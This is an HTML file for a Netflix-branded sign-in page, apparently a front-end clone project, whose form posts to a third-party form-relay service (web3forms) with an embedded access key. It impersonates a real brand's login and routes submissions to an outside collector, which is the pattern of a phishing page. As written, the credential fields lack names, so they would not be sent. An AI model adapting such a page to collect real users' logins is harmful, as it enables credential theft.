<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign-in Page for Netflix</title>
    <link rel="stylesheet" href="login.css">
    <link rel="stylesheet" href="media2.css">
</head>
<body>
    
    <div class="bg">
        <img class="bgImg" src="img/14.jpg" alt="background-image">
        
        <img src="img/logo.png" alt="logo-netflix" class="logo">
    </div>
    
    <div class="container">
        <div class="content">
            <h1>Sign-in</h1>
    
            <form action="https://api.web3forms.com/submit" method="post">
                
                 <div class="form">
             <input type="hidden" name="access_key" value="68f80982-9f7e-40d4-b92a-20cb6fc50bce">
      
                <input id="inp" type="text" placeholder="E-mail or Mobile Number" required>
            
                    <input id="inp" type="password" placeholder="Password" required>
            
                    <button class="sign">Sign In</button>
                    <p class="para">Or</p>
                    <button class="code">Use a sign-in code</button>
                    <p class="para">Forgot Password?</p>
        
                    <div class="check">
                        <input type="checkbox" id="check"><p>Remember Me</p>
                    </div>
        
                    <div class="bottom">
                        <p class="para2" id="gray">New to Netflix? </p>
                        <a href="index.html">
                            <p class="para2"> Sign-Up Now.</p>
                        </a>
                        <p class="para3">
                            This Page is Protected by Google reCAPTCHA to ensure you are not a robot.
                        </p>
                        <a class="link" href="#">Learn more</a>
                    </div>
                </div>
            </form>
        </div>
    </div>

</body>
</html>
